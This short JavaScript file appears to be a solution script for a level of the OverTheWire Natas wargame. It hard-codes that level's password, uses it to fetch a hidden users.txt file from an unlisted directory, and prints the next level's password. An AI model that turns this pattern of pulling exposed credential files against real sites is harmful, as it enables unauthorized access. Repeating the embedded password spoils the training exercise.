import axios from 'axios';

let username = 'natas3',
        password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14',
        pattern = /natas4:(.*)/,
        url = `http://${username}.natas.labs.overthewire.org/s3cr3t/users.txt`;

try {

  let response = await axios.get(url, {auth: { username, password }});
  let result = response.data.match(pattern);
  console.log(result[1]);

} catch (e) {
    console.error(e);
}

